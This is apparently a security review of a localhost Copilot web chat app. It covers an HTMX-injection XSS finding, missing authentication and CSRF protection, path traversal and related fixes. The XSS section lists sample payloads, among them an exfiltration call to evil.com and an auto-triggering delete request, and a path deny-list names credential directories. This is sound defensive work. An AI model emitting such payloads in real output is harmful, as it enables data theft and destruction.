# Security Analysis: Copilot Web Chat

**Last Updated:** 2026-01-24  
**Comprehensive Security Review**

---

## Executive Summary

**Overall Risk Level:** 🟡 **MODERATE** (for localhost use only)

This application is designed for **local development use** on a single-user machine. The security posture is **appropriate for localhost environments** but would require significant hardening before any network exposure. One critical XSS vulnerability has been previously identified and mitigated with DOMPurify.

---

## ⚠️ Critical Vulnerabilities

### 1. XSS via HTMX Injection (MITIGATED)

**Severity:** CRITICAL  
**Date Discovered:** 2026-01-24  
**Status:** ✅ MITIGATED with DOMPurify

#### Description

When the LLM response contains HTMX attributes (e.g., `hx-post`, `hx-get`, `hx-trigger`), these could be rendered as functional HTML in the chat interface, creating a **Cross-Site Scripting (XSS)** attack vector.

**Mitigation Implemented:** DOMPurify sanitization is now active (public/purify.min.js) and properly configured to strip dangerous attributes.

#### Reproduction

1. Ask Copilot about HTMX documentation
2. Response contains example code with HTMX attributes
3. The markdown renderer converts this to HTML
4. HTMX processes the HTML and activates the attributes
5. Functional buttons/forms appear that can make real HTTP requests

#### Impact

- **Arbitrary HTTP requests** from user's browser
- **Session hijacking** if cookies are accessible
- **Data exfiltration** via HTMX requests to external endpoints
- **CSRF attacks** against the local server
- **DOM manipulation** via hx-swap

#### Attack Vectors

```html
<!-- Malicious payloads that could appear in LLM responses -->

<!-- 1. Data exfiltration -->
<div hx-get="https://evil.com/steal?data=..." hx-trigger="load"></div>

<!-- 2. Auto-executing actions -->
<button hx-post="/api/sessions/delete" hx-trigger="load">Delete</button>

<!-- 3. Form injection -->
<form hx-post="/api/message">
  <input name="message" value="malicious command">
  <button>Send</button>
</form>

<!-- 4. Swap attacks -->
<div hx-get="/api/session" hx-swap="outerHTML" hx-target="body"></div>
```

---

## 🔒 Additional Critical Findings

### 2. NO AUTHENTICATION OR AUTHORIZATION
**Severity:** HIGH (if exposed) / LOW (localhost only)  
**Current Status:** By design for local use

- **Finding:** No authentication mechanism exists
- **Impact:** Anyone who can reach http://localhost:3000 can:
  - Access all sessions and conversation history
  - Execute commands through the AI agent  
  - Read/write files in working directories
  - Delete sessions
  - Switch between sessions
- **Current Mitigation:** Server binds to `127.0.0.1` only (line 474 in server.js)
- **Risk Level:** Acceptable for single-user localhost development
- **Recommendation:** 
  - ✅ **KEEP** localhost-only binding for current use case
  - ❌ **NEVER** expose to network without proper authentication
  - Consider adding password protection if other users share the machine

### 3. NO CSRF PROTECTION
**Severity:** MEDIUM  
**Current Status:** Vulnerable

- **Finding:** No CSRF tokens on state-changing operations
- **Impact:** Malicious websites opened in the same browser could:
  - Send messages on your behalf
  - Delete your sessions  
  - Create new sessions
  - Switch active sessions
  - Modify preferences
- **Vulnerable Endpoints:**
  - `POST /api/message`
  - `POST /api/sessions/new`
  - `POST /api/sessions/:id/resume`
  - `DELETE /api/sessions/:id`
  - `POST /api/preferences`
- **Recommendation:** Implement CSRF protection:
  ```javascript
  import csrf from 'csurf';
  const csrfProtection = csrf({ cookie: true });
  app.use(csrfProtection);
  ```

### 4. PATH TRAVERSAL RISK
**Severity:** HIGH  
**Current Status:** Partially protected

- **Finding:** User can specify arbitrary `cwd` paths when creating sessions (line 275-284 in server.js)
- **Current Protection:** Checks path exists and is a directory
- **Gap:** No restriction on which directories are allowed
- **Impact:** User (or malicious process) could:
  - Set cwd to `/`, `/etc`, or other sensitive system directories
  - Use AI agent to read sensitive system files
  - Execute commands in arbitrary directories
- **Recommendation:**
  ```javascript
  import { homedir } from 'os';
  import { resolve } from 'path';
  
  function isPathAllowed(requestedPath) {
    const resolved = resolve(requestedPath);
    const userHome = homedir();
    // Only allow paths under user's home directory
    if (!resolved.startsWith(userHome)) {
      throw new Error('Access denied: path outside home directory');
    }
    return true;
  }
  ```

### 5. UNENCRYPTED SESSION DATA
**Severity:** MEDIUM  
**Current Status:** Data at rest unencrypted

- **Finding:** All conversation history stored in plaintext at `~/.copilot/session-state/`
- **Impact:** 
  - Sensitive data (API keys, passwords, business logic) visible in session files
  - Accessible by any process running as the user
  - Persists indefinitely unless manually deleted
  - Could be exfiltrated by malware
  - Included in system backups
- **Recommendation:**
  - Document this risk clearly to users
  - Provide easy session cleanup functionality
  - Add "clear history" button in UI
  - Consider auto-expiration of old sessions
  - Warn users not to paste secrets in conversations

### 6. TEMPORARY FILE HANDLING
**Severity:** LOW  
**Current Status:** Minor race condition risk

- **Finding:** Image files saved with predictable timestamp-based names (line 343, 414 in server.js):
  ```javascript
  `copilot-image-${Date.now()}.${extension}`
  ```
- **Impact:** 
  - Predictable filenames allow potential race conditions
  - Files visible to other users in shared temp directory
  - Small time window where files exist unprotected
- **Recommendation:**
  ```javascript
  import { randomBytes } from 'crypto';
  const filename = `copilot-image-${randomBytes(16).toString('hex')}.${extension}`;
  ```

---

## 🛡️ Security Controls Present (Good Practices)

### ✅ Implemented Protections

1. **Localhost Binding** (server.js:474)
   ```javascript
   app.listen(PORT, '127.0.0.1', ...)
   ```
   - Prevents network exposure
   - **CRITICAL CONTROL** - Do not change this

2. **HTML Escaping** (server.js:458-467, script.js:512-521)
   - Properly escapes user input before rendering
   - Prevents XSS in user messages
   - Consistent implementation across codebase

3. **DOMPurify Sanitization** (public/purify.min.js)
   - Sanitizes markdown output before rendering
   - Industry-standard XSS protection library
   - Configured to block dangerous attributes
   - Good defense-in-depth approach

4. **Input Validation**
   - Message required check (server.js:398)
   - Path existence validation (server.js:279-284)
   - Image format validation (server.js:340, 407)
   - Directory type check

5. **Dependency Security**
   - ✅ `npm audit` shows **0 vulnerabilities** (verified 2026-01-24)
   - Minimal dependency tree (only 3 dependencies)
   - Using current/maintained packages:
     - express: 5.2.1
     - @github/copilot-sdk: 0.1.17
     - yaml: 2.8.2

6. **SSE Security Headers** (server.js:318-322)
   - Proper Cache-Control: no-cache
   - Connection: keep-alive
   - X-Accel-Buffering: no (prevents nginx buffering)
   - Prevents caching of sensitive streaming data

7. **Resource Cleanup** (multiple locations)
   - Temporary files deleted after use (server.js:362-364, 429-431)
   - Event listeners properly unsubscribed (server.js:369-373)
   - Graceful shutdown handling (server.js:481-487)
   - Prevents resource leaks and file system clutter

---

## 🔍 Additional Security Concerns

### 7. NO RATE LIMITING
**Severity:** LOW (localhost) / HIGH (if networked)

- **Finding:** No rate limiting on any endpoints
- **Impact:** 
  - Could be abused by malicious local process
  - Expensive AI API calls could rack up costs
  - Potential denial of service
- **Recommendation:**
  ```javascript
  import rateLimit from 'express-rate-limit';
  const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100 // limit requests per IP
  });
  app.use('/api/', limiter);
  ```

### 8. NO REQUEST SIZE LIMITS
**Severity:** LOW

- **Finding:** No explicit body size limits configured
- **Current:** Default Express limits apply (100kb for JSON)
- **Issue:** Image data sent via query params could exceed reasonable limits
- **Recommendation:**
  ```javascript
  app.use(express.json({ limit: '10mb' }));
  app.use(express.urlencoded({ limit: '10mb', extended: true }));
  ```

### 9. ERROR MESSAGE DISCLOSURE
**Severity:** LOW

- **Finding:** Detailed error messages sent to client (server.js:447, 453)
- **Impact:** Stack traces may leak:
  - File system paths
  - Internal structure
  - Library versions
- **Recommendation:** 
  - Generic error messages for client
  - Detailed logging server-side only
  - Example:
    ```javascript
    } catch (error) {
      console.error('Error details:', error); // Server log only
      res.status(500).send('<div class="error">An error occurred</div>');
    }
    ```

### 10. NO AUDIT LOGGING
**Severity:** MEDIUM

- **Finding:** No structured logging of security-relevant actions
- **Impact:** 
  - Cannot detect abuse or suspicious activity
  - Difficult to investigate incidents
  - No forensic trail
- **What Should Be Logged:**
  - Session creation/deletion
  - File access attempts
  - Command execution
  - Failed operations
  - Path validation failures
- **Recommendation:**
  ```javascript
  function auditLog(action, details) {
    console.log(JSON.stringify({
      timestamp: new Date().toISOString(),
      action,
      sessionId: activeSessionId,
      ...details
    }));
  }
  
  // Usage:
  auditLog('session.create', { cwd, model });
  auditLog('session.delete', { sessionId });
  ```

### 11. SESSION HIJACKING RISK
**Severity:** MEDIUM (same machine)

- **Finding:** No session tokens or authentication
- **Impact:** Any local process can use the API endpoints
- **Attack Scenario:**
  - Malicious browser extension makes requests to localhost:3000
  - Local malware sends API calls
  - Another browser tab (different domain) issues requests
- **Recommendation:** Add simple token validation:
  ```javascript
  // Generate on server start
  const serverToken = randomBytes(32).toString('hex');
  
  // Require in requests
  app.use('/api/', (req, res, next) => {
    if (req.headers['x-server-token'] !== serverToken) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  });
  ```

### 12. NO CONTENT SECURITY POLICY
**Severity:** LOW

- **Finding:** Missing CSP headers
- **Impact:** Reduces defense-in-depth against XSS
- **Recommendation:**
  ```javascript
  app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', 
      "default-src 'self'; " +
      "script-src 'self' 'unsafe-inline'; " +
      "style-src 'self' 'unsafe-inline'; " +
      "img-src 'self' data: blob:; " +
      "connect-src 'self'; " +
      "font-src 'self';"
    );
    next();
  });
  ```

### 13. DEPENDENCY SUPPLY CHAIN
**Severity:** LOW

- **Finding:** Third-party JavaScript libraries in public/ folder
- **Files:** marked.min.js, mermaid.min.js, highlight.min.js, purify.min.js, htmx.min.js
- **Current State:** Local copies (good - not loading from CDN)
- **Risk:** If files were compromised before download, could contain malicious code
- **Recommendation:**
  - Document versions and download sources
  - Use npm packages where possible
  - If using CDN, implement SRI (Subresource Integrity):
    ```html
    <script src="..." 
      integrity="sha384-..." 
      crossorigin="anonymous"></script>
    ```

---

## 📊 OWASP Top 10 2021 Assessment

| Risk | Status | Severity | Notes |
|------|--------|----------|-------|
| **A01:2021 Broken Access Control** | ⚠️ VULNERABLE | HIGH | No authentication, CSRF, path traversal issues |
| **A02:2021 Cryptographic Failures** | ⚠️ VULNERABLE | MEDIUM | Sessions stored unencrypted at rest |
| **A03:2021 Injection** | ✅ PROTECTED | - | HTML escaping + DOMPurify sanitization |
| **A04:2021 Insecure Design** | ⚠️ PARTIAL | LOW | Designed for localhost only (acceptable for use case) |
| **A05:2021 Security Misconfiguration** | ✅ GOOD | - | Localhost binding, no unnecessary features |
| **A06:2021 Vulnerable Components** | ✅ GOOD | - | 0 npm vulnerabilities, up-to-date packages |
| **A07:2021 Auth Failures** | ⚠️ VULNERABLE | HIGH | No authentication mechanism |
| **A08:2021 Data Integrity Failures** | ⚠️ VULNERABLE | MEDIUM | No CSRF protection, no request signing |
| **A09:2021 Logging Failures** | ⚠️ VULNERABLE | MEDIUM | No audit logging, no monitoring |
| **A10:2021 SSRF** | ✅ PROTECTED | - | No user-controlled external requests |

**Overall Score:** 5/10 protected, 5/10 vulnerable  
**Suitable for:** Local development, single-user machines  
**Not suitable for:** Network deployment, multi-user environments

---

## 🎯 Prioritized Remediation Plan

### IMMEDIATE (Critical - Do Now)
1. ✅ **Verify localhost binding** - Confirm server never exposed to network
   - Check firewall rules: `sudo ufw status`
   - Check listening ports: `netstat -tlnp | grep 3000`
   
2. 🔧 **Add CSRF protection** - Implement token validation
   - Install: `npm install csurf cookie-parser`
   - Impact: Prevents cross-site request forgery
   
3. 🔧 **Restrict path access** - Whitelist allowed directories
   - Add home directory validation
   - Prevent access to system directories
   
4. 📝 **Document security model** - Update README with security guidelines
   - Clearly state "LOCAL USE ONLY"
   - Document risks and safe usage

### SHORT TERM (Important - Next Sprint)
5. 🔧 **Add rate limiting** - Prevent abuse by local processes
   - Install: `npm install express-rate-limit`
   - Set reasonable limits per endpoint
   
6. 🔧 **Implement audit logging** - Track all security-relevant operations
   - Log session operations
   - Log file access
   - Log errors and failures
   
7. 🔧 **Improve temp file security** - Use cryptographically random filenames
   - Replace Date.now() with crypto.randomBytes()
   
8. 🔧 **Add CSP headers** - Additional XSS protection layer
   - Configure Content-Security-Policy
   
9. 🔧 **Add session cleanup UI** - Allow users to clear old sessions easily

### LONG TERM (Future - Nice to Have)
10. 🔧 **Session encryption** - Encrypt sensitive data at rest
    - Requires SDK support or custom encryption layer
    
11. 🔧 **Authentication system** - If multi-user scenarios arise
    - Simple password protection for localhost
    
12. 🔧 **Request signing** - Prevent local session hijacking
    - Token-based validation for API requests
    
13. 🔧 **Auto-expire sessions** - Automatic cleanup of old conversations
    - Reduce sensitive data retention
    
14. 🔧 **Security headers package** - Use helmet.js
    - `npm install helmet`

---

## 🚨 Red Lines - NEVER Cross These

### Absolutely do NOT do these without major security hardening:

- ❌ **NEVER** change binding from `127.0.0.1` to `0.0.0.0`
- ❌ **NEVER** expose port 3000 through firewall/router/NAT
- ❌ **NEVER** deploy to cloud/VPS without authentication
- ❌ **NEVER** share the machine with untrusted users
- ❌ **NEVER** run as root/administrator
- ❌ **NEVER** disable HTML escaping or DOMPurify
- ❌ **NEVER** add eval() or similar dynamic code execution
- ❌ **NEVER** remove the localhost binding check

### If you must expose to network, you MUST implement:
- ✅ Strong authentication (OAuth, API keys, etc.)
- ✅ HTTPS/TLS encryption
- ✅ CSRF protection
- ✅ Rate limiting
- ✅ Input validation on all endpoints
- ✅ Session encryption at rest
- ✅ Audit logging
- ✅ Security headers (CSP, HSTS, etc.)
- ✅ Regular security audits

---

## ✅ Safe Usage Guidelines

### Current Configuration is SAFE for:
- ✅ Personal development on your own machine
- ✅ Single-user workstation environments  
- ✅ Trusted local development
- ✅ Testing and experimentation
- ✅ Private laptop/desktop (not shared)

### Current Configuration is UNSAFE for:
- ❌ Multi-tenant systems
- ❌ Shared hosting environments
- ❌ Production internet-facing deployment
- ❌ Public networks (coffee shops, conferences)
- ❌ Machines with multiple users
- ❌ Cloud/VPS deployment
- ❌ Corporate networks with untrusted users
- ❌ Any scenario where port 3000 is network-accessible

---

## 📋 Security Maintenance Checklist

Run through this checklist monthly:

- [ ] Verify server still binds to `127.0.0.1` only
  ```bash
  grep "127.0.0.1" server.js
  netstat -tlnp | grep 3000
  ```
  
- [ ] Check for npm vulnerabilities
  ```bash
  npm audit
  npm outdated
  ```
  
- [ ] Update dependencies
  ```bash
  npm update
  npm audit fix
  ```
  
- [ ] Review session directory for sensitive data
  ```bash
  ls -lh ~/.copilot/session-state/
  ```
  
- [ ] Delete old/unnecessary sessions
  - Use the UI to clean up sessions
  - Or manually: `rm -rf ~/.copilot/session-state/OLD_SESSION_ID`
  
- [ ] Check server.log for unusual activity
  ```bash
  tail -f server.log
  ```
  
- [ ] Verify firewall blocks port 3000 from network
  ```bash
  sudo ufw status
  sudo iptables -L | grep 3000
  ```
  
- [ ] Scan for exposed ports
  ```bash
  ss -tulpn | grep 3000
  ```

---

## 🔧 Quick Security Improvements

### Copy-paste these improvements into your code:

#### 1. Add CSRF Protection

```javascript
// Install: npm install csurf cookie-parser
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

app.use(cookieParser());
const csrfProtection = csrf({ cookie: true });

// Apply to state-changing routes
app.post('/api/message', csrfProtection, async (req, res) => { ... });
app.post('/api/sessions/new', csrfProtection, async (req, res) => { ... });
app.delete('/api/sessions/:sessionId', csrfProtection, async (req, res) => { ... });

// Send token to client
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});
```

#### 2. Add Rate Limiting

```javascript
// Install: npm install express-rate-limit
import rateLimit from 'express-rate-limit';

const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Max 100 requests per window
  message: 'Too many requests, please try again later'
});

const streamLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 20, // Max 20 streaming requests per minute
});

app.use('/api/', apiLimiter);
app.use('/api/stream', streamLimiter);
```

#### 3. Add Path Whitelist

```javascript
import { homedir } from 'os';
import { resolve } from 'path';

function validatePath(requestedPath) {
  const resolved = resolve(requestedPath);
  const userHome = homedir();
  
  // Must be under user's home directory
  if (!resolved.startsWith(userHome)) {
    throw new Error('Access denied: path must be under home directory');
  }
  
  // Block dangerous paths even if under home
  const dangerous = ['.ssh', '.gnupg', '.aws', 'Library/Keychains'];
  for (const blocked of dangerous) {
    if (resolved.includes(blocked)) {
      throw new Error(`Access denied: ${blocked} directory not allowed`);
    }
  }
  
  return resolved;
}

// Use in /api/sessions/new
app.post('/api/sessions/new', async (req, res) => {
  try {
    const cwd = validatePath(req.body.cwd || process.cwd());
    // ... rest of code
  } catch (error) {
    return res.status(403).json({ error: error.message });
  }
});
```

#### 4. Add Security Headers

```javascript
// Install: npm install helmet
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // unsafe-inline needed for inline scripts
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "blob:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  },
  hsts: false, // Not needed for localhost
  referrerPolicy: { policy: 'same-origin' }
}));
```

#### 5. Add Audit Logging

```javascript
// Add at top of server.js
function auditLog(action, details = {}) {
  const logEntry = {
    timestamp: new Date().toISOString(),
    action,
    sessionId: activeSessionId,
    ...details
  };
  console.log('[AUDIT]', JSON.stringify(logEntry));
}

// Use throughout code:
auditLog('server.start', { port: PORT });
auditLog('session.create', { cwd, model });
auditLog('session.resume', { sessionId });
auditLog('session.delete', { sessionId, wasActive });
auditLog('message.send', { model, hasImage: !!imageData });
auditLog('error.path_validation', { requestedPath, error: e.message });
```

#### 6. Improve Temp File Security

```javascript
import { randomBytes } from 'crypto';

// Replace Date.now() with secure random:
const filename = `copilot-image-${randomBytes(16).toString('hex')}.${extension}`;
tempFilePath = join(tmpdir(), filename);
```

---

## 📚 References & Resources

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [Node.js Security Checklist](https://github.com/goldbergyoni/nodebestpractices#6-security-best-practices)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [HTMX Security](https://htmx.org/docs/#security)
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [npm Security Advisories](https://www.npmjs.com/advisories)
- [Snyk Vulnerability Database](https://security.snyk.io/)

---

## 📝 Revision History

- **2026-01-24 (v2)**: Comprehensive security review
  - Expanded to 13 security findings
  - Added OWASP Top 10 assessment
  - Provided prioritized remediation plan
  - Added code samples for quick fixes
  - Documented safe usage guidelines
  - Created maintenance checklist
  
- **2026-01-24 (v1)**: Initial XSS vulnerability identified
  - Documented HTMX injection risk
  - Implemented DOMPurify mitigation
  - Added basic security notes

### Option 1: DOMPurify (Recommended)

Use DOMPurify to sanitize HTML before insertion:

```javascript
// Install: copy DOMPurify to public folder or use CDN
// <script src="purify.min.js"></script>

const clean = DOMPurify.sanitize(dirtyHTML, {
  FORBID_ATTR: ['hx-get', 'hx-post', 'hx-put', 'hx-delete', 'hx-patch',
                'hx-trigger', 'hx-target', 'hx-swap', 'hx-vals',
                'hx-confirm', 'hx-boost', 'hx-push-url', 'hx-on',
                'onclick', 'onerror', 'onload', 'onmouseover'],
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form']
});
```

### Option 2: HTMX hx-disable

Wrap dynamic content in a container with `hx-disable`:

```html
<div hx-disable>
  <!-- LLM response rendered here - HTMX won't process -->
</div>
```

**Note:** This only works if HTMX respects the attribute during dynamic insertion. Need to verify.

### Option 3: Text-only rendering

Don't render markdown as HTML - display as escaped text:

```javascript
element.textContent = response; // Safe but loses formatting
```

### Option 4: Sandboxed iframe

Render responses in a sandboxed iframe:

```html
<iframe sandbox="allow-same-origin" srcdoc="..."></iframe>
```

### Option 5: Content Security Policy

Add CSP headers to restrict what can execute:

```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; script-src 'self'; connect-src 'self'");
  next();
});
```

---

## Recommended Fix

### Immediate: Use hx-disable

Wrap all LLM response content in `hx-disable`:

```javascript
// In script.js addUserBubble()
assistantDiv.innerHTML = `
  <strong>Copilot:</strong>
  <div class="activity-wrapper">...</div>
  <div class="markdown-content streaming-cursor" hx-disable></div>
`;
```

### Complete: Add DOMPurify

1. Download DOMPurify: https://github.com/cure53/DOMPurify
2. Add to public folder
3. Sanitize all HTML before insertion:

```javascript
// In markdown-renderer.js
function renderMarkdown() {
  document.querySelectorAll('[data-markdown] .markdown-content').forEach(el => {
    const raw = el.textContent;
    const html = marked.parse(raw);
    const clean = DOMPurify.sanitize(html, {
      FORBID_ATTR: ['hx-get', 'hx-post', 'hx-put', 'hx-delete', 
                    'hx-trigger', 'hx-target', 'hx-swap', 'hx-vals',
                    'hx-on', 'onclick', 'onerror', 'onload'],
      FORBID_TAGS: ['script', 'iframe', 'object', 'embed']
    });
    el.innerHTML = clean;
  });
}
```

---

## Other Security Considerations

### 1. Local Server Exposure

The server runs on `localhost:3000` - ensure it's not exposed to the network:

```javascript
app.listen(PORT, '127.0.0.1', () => { ... }); // Bind to localhost only
```

### 2. Path Traversal

The `/api/sessions/new` endpoint accepts a `cwd` parameter. Ensure validation:
- ✓ Already checks path exists
- ✓ Already checks is directory
- Consider: restrict to user home or workspace

### 3. Temp File Cleanup

Image attachments create temp files. Ensure cleanup on all error paths:
- ✓ Cleanup in try/catch
- Consider: periodic cleanup of orphaned files

### 4. Session State

Sessions are stored in `~/.copilot/session-state/`. Consider:
- File permissions (should be 600)
- Sensitive data in session history

---

## References

- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [HTMX Security](https://htmx.org/docs/#security)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
